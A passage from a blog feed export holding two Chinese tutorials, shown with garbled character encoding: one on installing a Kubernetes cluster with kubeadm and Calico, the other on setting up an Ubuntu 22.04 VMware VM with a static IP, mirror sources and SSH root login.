class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æœ€ç»ˆé…ç½®</span><br>[root@k8s-master ~]<span class="hljs-comment"># cat kubeadm.yaml</span><br>apiVersion: kubeadm.k8s.io/v1beta3<br>bootstrapTokens:<br>- <span class="hljs-built_in">groups</span>:<br>  - system:bootstrappers:kubeadm:default-node-token<br>  token: abcdef.0123456789abcdef<br>  ttl: 24h0m0s<br>  usages:<br>  - signing<br>  - authentication<br>kind: InitConfiguration<br>localAPIEndpoint:<br>  advertiseAddress: 192.168.1.100<br>  bindPort: 6443<br>nodeRegistration:<br>  criSocket: unix:///var/run/containerd/containerd.sock<br>  imagePullPolicy: IfNotPresent<br>  name: k8s-master<br>  taints: null<br>---<br>apiServer:<br>  timeoutForControlPlane: 4m0s<br>  certSANs:<br>  - 192.168.1.100<br>apiVersion: kubeadm.k8s.io/v1beta3<br>certificatesDir: /etc/kubernetes/pki<br>clusterName: kubernetes<br>controllerManager: &#123;&#125;<br>dns: &#123;&#125;<br>etcd:<br>  <span class="hljs-built_in">local</span>:<br>    dataDir: /var/lib/etcd<br>imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers<br>kind: ClusterConfiguration<br>kubernetesVersion: 1.24.4<br>networking:<br>  dnsDomain: cluster.local<br>  podSubnet: 10.244.0.0/16<br>  serviceSubnet: 10.96.0.0/12<br>scheduler: &#123;&#125;<br>---<br><span class="hljs-comment"># æŒ‡å®šcgroup</span><br>apiVersion: kubelet.config.k8s.io/v1beta1<br>kind: KubeletConfiguration<br>cgroupDriver: systemd<br><br></code></pre></td></tr></table></figure><h3 id="nodeèŠ‚ç‚¹"><a href="#nodeèŠ‚ç‚¹" class="headerlink" title="nodeèŠ‚ç‚¹"></a>nodeèŠ‚ç‚¹</h3><p>ä¸¤ä¸ªèŠ‚ç‚¹éƒ½æ‰§è¡Œå¦‚ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/etc/</span>containerd/config.toml  |<span class="hljs-keyword">grep</span> image<br><br>sed -i <span class="hljs-string">&quot;s#registry.k8s.io/pause:3.6#registry.aliyuncs.com/google_containers/pause:3.6#g&quot;</span>  <span class="hljs-regexp">/etc/</span>containerd/config.toml<br><br>systemctl daemon-reload &amp;&amp; systemctl restart containerd<br><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">kubeadm <span class="hljs-keyword">join</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>:<span class="hljs-number">6443</span> <span class="hljs-comment">--token abcdef.0123456789abcdef \</span><br>        <span class="hljs-comment">--discovery-token-ca-cert-hash sha256:3ce5d8f9fd07a09dd1625531de6876f3b41110c4e005a1c2b5470fbf074ab5cf</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002345.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002433.png"></p><p>é›†ç¾¤å®‰è£…æˆåŠŸ~</p><h2 id="ç½‘ç»œæ’ä»¶"><a href="#ç½‘ç»œæ’ä»¶" class="headerlink" title="ç½‘ç»œæ’ä»¶"></a>ç½‘ç»œæ’ä»¶</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ä½¿ç”¨calico</span><br><span class="hljs-attribute">curl</span> https://raw.githubusercontent.com/projectcalico/calico/v3.<span class="hljs-number">24</span>.<span class="hljs-number">1</span>/manifests/calico.yaml -o calico-<span class="hljs-number">3</span>-<span class="hljs-number">24</span>-<span class="hljs-number">1</span>.yaml<br><span class="hljs-attribute">kubectl</span> apply -f calico-<span class="hljs-number">3</span>-<span class="hljs-number">24</span>-<span class="hljs-number">1</span>.yaml<br></code></pre></td></tr></table></figure><p>éƒ¨ç½²å®Œæˆä¹‹åå¤šç­‰ä¸€ä¼šï¼Œå°±ä¼šå˜æˆrunningäº†~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002845.png"></p><p>nodeä¹Ÿå…¨éƒ¨éƒ½æ˜¯readyäº†~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003224.png"></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl create deployment nginx <span class="hljs-attribute">--image</span>=nginx<br>kubectl <span class="hljs-built_in">get</span> pod<br>kubectl expose deployment nginx <span class="hljs-attribute">--port</span>=80 <span class="hljs-attribute">--type</span>=NodePort<br>kubectl <span class="hljs-built_in">get</span> pod,svc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003700.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003628.png"></p><h2 id="å·¥å…·ç±»å­¦ä¹ "><a href="#å·¥å…·ç±»å­¦ä¹ " class="headerlink" title="å·¥å…·ç±»å­¦ä¹ "></a>å·¥å…·ç±»å­¦ä¹ </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;registry.k8s.io/pause:3.6&#x27;</span> /var/log/syslog<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/shelutai/article/details/126604857"># [æœ€æ–°]ubuntu22.04å®‰è£…kubernetes1.25 k8s1.25</a> å‰åŠéƒ¨åˆ†é…ç½®<br><a href="https://blog.51cto.com/belbert/5872146">Ubuntu22.04 å®‰è£… K8S</a> ååŠéƒ¨åˆ†é…ç½®     kubeadmçš„configé…ç½®    ipvsé…ç½®</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>kubeadm</tag>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202211) VMware16.2.2ä¸­åˆ›å»ºubuntu22.04.1è™šæ‹Ÿæœº+ä¿®æ”¹é™æ€ip+æ¢æº+mobaxtermè¿œç¨‹è¿æ¥+ä¿®æ”¹å‘½ä»¤æç¤ºç¬¦é¢œè‰²(ckaè€ƒè¯•è™šæ‹Ÿæœºæ­å»º)</title>
    <link href="/2022/11/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p>é•œåƒï¼š<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/</a>    </p><p>vmwareï¼š16.2.2</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li>åˆ›å»ºè™šæ–°çš„è™šæ‹Ÿæœº</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185445.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185633.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185651.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185750.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185804.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185816.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185832.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185917.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185842.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190003.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190013.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190027.png"></p><p>é…ç½®å®Œå‚æ•°ä¹‹åï¼Œç³»ç»Ÿå¼€å§‹å®‰è£…ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190802.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190938.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191146.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191231.png"></p><p>æ­¤å¤„å¯ä»¥æŠŠDownload updates while installing ubuntu å…³æ‰ï¼Œä¸å…³çš„è¯ï¼Œç½‘ä¸å¥½ï¼Œä¼šå¯¼è‡´è™šæ‹Ÿæœºå®‰è£…å¡åœ¨æŸä¸€ä¸ªåœ°æ–¹ä¸€åŠ¨ä¸åŠ¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191417.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191443.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191533.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191722.png"></p><p>å¼€å§‹äº†æ¼«é•¿çš„å®‰è£…<br>19:17-19:47  å®‰è£…å¥½å•¦</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194733.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195042.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195104.png"></p><h2 id="è¿›é˜¶1"><a href="#è¿›é˜¶1" class="headerlink" title="è¿›é˜¶1"></a>è¿›é˜¶1</h2><h3 id="dnsæ— æ³•è§£æ"><a href="#dnsæ— æ³•è§£æ" class="headerlink" title="dnsæ— æ³•è§£æ"></a>dnsæ— æ³•è§£æ</h3><p>å‘ç°è™šæ‹Ÿæœºè§£æä¸äº†åŸŸåï¼ŒåŸŸåä¸èƒ½è®¿é—®ï¼Œipå¯ä»¥è®¿é—®(ipæ˜¯é€šè¿‡ä¸€å°æ­£å¸¸çš„è™šæ‹Ÿæœºè§£æå‡ºæ¥çš„ï¼Œä¸‹é¢ç¬¬2å¼ å›¾)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220751.png"></p><p>æŸ¥çœ‹ç½‘å…³ï¼Œpingç½‘å…³æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121221838.png"></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;resolv.confæ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰å¯ç”¨çš„dnsæœåŠ¡å™¨<br>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ·»åŠ dnsæœåŠ¡å™¨çš„è¯ï¼Œæ¯æ¬¡é‡å¯å°±ä¼šè¢«åˆ·æˆä¹‹å‰çš„é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231402.png"></p><p>æˆ‘ä»¬é‡‡ç”¨ä¿®æ”¹é™æ€ipçš„åŠæ³•ï¼Œé¡ºä¾¿æŠŠdnsåŠ ä¸Š</p><h3 id="ä¿®æ”¹é™æ€ip"><a href="#ä¿®æ”¹é™æ€ip" class="headerlink" title="ä¿®æ”¹é™æ€ip"></a>ä¿®æ”¹é™æ€ip</h3><p>æŸ¥çœ‹ç½‘å¡é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230356.png"></p><p>è¿™æ˜¯æ²¡æœ‰ä¿®æ”¹ä¹‹å‰çš„ç½‘å¡é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230424.png"></p><p>ä¿®æ”¹&#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yamlæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230443.png"></p><p>æ‰§è¡Œï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netplan <span class="hljs-built_in">apply</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230608.png"></p><p>æ³¨é‡Šæ‰renderer<br>(å¦‚æœæ²¡åŠ rendererä¹ŸæŠ¥è¿™ä¸ªé”™ï¼Œå†æ¬¡æ‰§è¡Œnetplan applyå°±okäº†)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231048.png"></p><p>æŸ¥çœ‹ipåœ°å€ï¼Œå·²ç»æˆåŠŸæ›´æ”¹~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231118.png"></p><p>å†æ¬¡pingåŸŸåï¼Œå·²ç»æ²¡æœ‰é—®é¢˜å•¦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231237.png"></p><p>yamlæ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-22:~<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br>network:<br>  ethernets:<br>    ens33:<br>      dhcp4: no<br>      dhcp6: no<br>      addresses:<br>        - 192.168.1.100/24<br>      routes:<br>        - to: default<br>          via: 192.168.1.2<br>      nameservers:<br>        addresses:<br>          - 114.114.114.114<br>          - 8.8.8.8<br>  version: 2<br>  <span class="hljs-comment">#renderer: networkd</span><br><br></code></pre></td></tr></table></figure><h3 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h3><p>æƒ³è¦ä¸‹è½½ä¸€ä¸ªvimï¼Œå‘ç°ä¸‹è½½ä¸äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231937.png"></p><p>æ¢æºæ“ä½œæ¥ä¸€æ³¢</p><p>Ubuntu çš„è½¯ä»¶æºé…ç½®æ–‡ä»¶æ˜¯ &#x2F;etc&#x2F;apt&#x2F;sources.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>å¤‡ä»½åŸå§‹æºæ–‡ä»¶source.list <br>sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br> <br>ä¿®æ”¹æºæ–‡ä»¶sources.list  ä¸­ç§‘å¤§ubuntu 22.04é•œåƒ<br>sudo <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /etc/apt/sources.list</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br><br><br>apt update<br></code></pre></td></tr></table></figure><p>updateä¹‹åï¼Œå¯ä»¥é¡ºç•…ä¸‹è½½vimäº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121232236.png"></p><h2 id="è¿›é˜¶2"><a href="#è¿›é˜¶2" class="headerlink" title="è¿›é˜¶2"></a>è¿›é˜¶2</h2><h3 id="è¿œç¨‹è¿æ¥"><a href="#è¿œç¨‹è¿æ¥" class="headerlink" title="è¿œç¨‹è¿æ¥"></a>è¿œç¨‹è¿æ¥</h3><h4 id="æ™®é€šç”¨æˆ·è¿æ¥"><a href="#æ™®é€šç”¨æˆ·è¿æ¥" class="headerlink" title="æ™®é€šç”¨æˆ·è¿æ¥"></a>æ™®é€šç”¨æˆ·è¿æ¥</h4><p>ubuntu  éƒ½åŸç”Ÿæœ‰äº†sshå®¢æˆ·ç«¯ï¼Œå¯ä»¥é€šè¿‡ssh å‘½ä»¤æ£€éªŒ.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234308.png"></p><p>è¿œç¨‹è¿æ¥çš„æœåŠ¡å™¨ç«¯æ²¡æœ‰è‡ªå¸¦ï¼Œéœ€è¦è‡ªè¡Œå®‰è£…ï¼Œå‘½ä»¤ä¸ºï¼š</p><p>sudo apt install openssh-server</p><p>æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><p>è¿œç¨‹è¿æ¥ï¼Œå¯ä»¥æˆåŠŸè¿æ¥</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> username<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯cmdçš„è¿œç¨‹è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233518.png"></p><p>è¿™ä¸ªæ˜¯mobaxtermçš„è¿œç¨‹è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233608.png"></p><h4 id="rootè¿æ¥"><a href="#rootè¿æ¥" class="headerlink" title="rootè¿æ¥"></a>rootè¿æ¥</h4><p>åˆšåˆšæ˜¯æ™®é€šç”¨æˆ·çš„è¿æ¥ï¼Œæ­¤æ—¶rootç”¨æˆ·è¿˜æ˜¯æ— æ³•è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233654.png"></p><p>Ubuntuä¸­SSHæœåŠ¡å®‰è£…å®ŒæˆåæŸ¥çœ‹æ˜¯å¦å…è®¸rootç”¨æˆ·ç™»é™†ï¼Œè‹¥ä¸å…è®¸åˆ™æ— æ³•è¿œç¨‹ç™»é™†rootç”¨æˆ·ï¼Œéœ€è¦ä¿®æ”¹é…ç½®</p><p>æ‰“å¼€â€œ&#x2F;etc&#x2F;ssh&#x2F;sshd_configâ€</p><p>sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>æ‰¾åˆ°å¹¶ç”¨#æ³¨é‡Šæ‰è¿™è¡Œï¼šPermitRootLogin prohibit-password</p><p>æŸ¥çœ‹æ˜¯å¦æœ‰â€œPermitRootLogin yesâ€æ–°å»ºä¸€è¡Œ æ·»åŠ ï¼šPermitRootLogin yes</p><p>é‡å¯æœåŠ¡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>sudo systemctl restart ssh<br></code></pre></td></tr></table></figure><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯è¿ä¸ä¸Š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233948.png"></p><h4 id="ä¿®æ”¹rootå¯†ç "><a href="#ä¿®æ”¹rootå¯†ç " class="headerlink" title="ä¿®æ”¹rootå¯†ç "></a>ä¿®æ”¹rootå¯†ç </h4><p>Ubuntuçš„ é»˜è®¤rootå¯†ç æ˜¯éšæœºçš„ï¼Œå³æ¯æ¬¡å¼€æœºéƒ½æœ‰ä¸€ä¸ªæ–°çš„rootå¯†ç ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ sudo passwdï¼Œç„¶åè¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ï¼Œ enterï¼Œ</p><p>ç»ˆç«¯ä¼šæç¤ºæˆ‘ä»¬è¾“å…¥æ–°çš„å¯†ç å¹¶ç¡®è®¤ï¼Œæ­¤æ—¶çš„å¯†ç å°±æ˜¯rootæ–°å¯†ç ã€‚ä¿®æ”¹æˆåŠŸåï¼Œè¾“å…¥å‘½ä»¤ su rootï¼Œå†è¾“å…¥æ–°çš„å¯†ç å°±okäº†ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234148.png"></p><p>å†æ¬¡ä½¿ç”¨rootè¿æ¥ï¼Œå‘ç°å°±å¯ä»¥æˆåŠŸè¿æ¥äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234119.png"></p><h2 id="è¿›é˜¶3"><a href="#è¿›é˜¶3" class="headerlink" title="è¿›é˜¶3"></a>è¿›é˜¶3</h2><h3 id="ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²"><a href="#ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²" class="headerlink" title="ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²"></a>ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br>PS1=<span class="hljs-string">&#x27;\[\e[32;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment"># green</span><br>PS1=<span class="hljs-string">&#x27;\[\e[34;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment">#blue</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128220437.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç»ˆç«¯å·²ç»å˜æˆäº†ç»¿è‰²ã€‚è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒé™„ä»¶çš„èµ„æ–™ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://blog.csdn.net/xiangxianghehe/article/details/122856771">Ubuntu 22.04æ¢å›½å†…æº æ¸…åæº é˜¿é‡Œæº ä¸­ç§‘å¤§æº 163æº</a><br><a href="https://blog.csdn.net/howiecode/article/details/120457571">ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•æ•™ç¨‹</a><br><a href="https://blog.csdn.net/weixin_42072280/article/details/112536544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166964433816782429786434%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166964433816782429786434&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-112536544-null-null.nonecase&utm_term=%E7%BB%88%E7%AB%AF&spm=1018.2226.3001.4450"># Xshell Linux centOSå‘½ä»¤æç¤ºç¬¦æ”¹é¢œè‰²</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
      <tag>net</tag>
      
      <tag>vmware</tag>
      
      <tag>mobaxterm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
